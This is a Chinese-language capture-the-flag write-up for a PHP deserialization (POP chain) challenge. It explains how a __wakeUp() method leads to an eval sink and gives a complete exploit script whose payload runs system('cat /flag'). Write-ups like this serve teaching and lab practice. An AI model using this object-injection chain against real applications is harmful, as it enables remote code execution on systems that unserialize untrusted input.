# WriteUP · Level 15


一个简单的POP链题目原理题 —— 虽然是POP链有多个对象但本质上只用到了__wakeUp()魔术方法。

在 PHP 的面向对象中，对象的成员属性可以是一个对象（这里的对象包括自己在内的对象和其他对象）。

在序列化和反序列化题目中，我们通常从终点向上查找，比如下面的题目： 很明显，终点是：`class destnation` — `public function action(){ eval($this->cmd->a->b->c); }`

接下来就是考虑去调用终点，查找所有类，最后在D类中可以看到：

```
class D { public function __wakeUp() { $this->d->action(); }
```

即 `__wakeUp()` 函数存在一个 `action()` 的函数调用，所以我们只需要让 `$this->d` 的值为 实例化的 `class destnation`即可，那么EXP如下：

```PHP
<?php

class A {
    public $a;
    public function __construct($a) {
        $this->a = $a;
    }
}
class B {
    public $b;
    public function __construct($b) {
        $this->b = $b;
    }
}
class C {
    public $c;
    public function __construct($c) {
        $this->c = $c;
    }
}

class D {
    public $d;
    public function __construct($d) {
        $this->d = $d;
    }
    public function __wakeUp() {
        $this->d->action();
    }
}

class destnation {
    var $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
    public function action(){
        eval($this->cmd->a->b->c);
    }
}

$c = new C("system('cat /flag');");
$b = new B($c);
$a = new A($b);
$des = new destnation($a);
$d =  new D($des);

unserialize(serialize($d));
```

